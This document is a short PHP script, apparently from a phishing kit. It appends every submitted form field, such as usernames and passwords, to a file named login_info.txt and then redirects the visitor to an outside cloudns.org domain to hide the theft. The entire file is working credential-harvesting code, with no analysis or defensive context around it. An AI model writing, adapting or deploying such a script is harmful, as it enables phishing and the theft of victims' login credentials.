<?php
header ('Location: https://fidah-imorou.cloudns.org; lwv=110');
$handle = fopen("login_info.txt", "a");
foreach ($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
exit;
?>
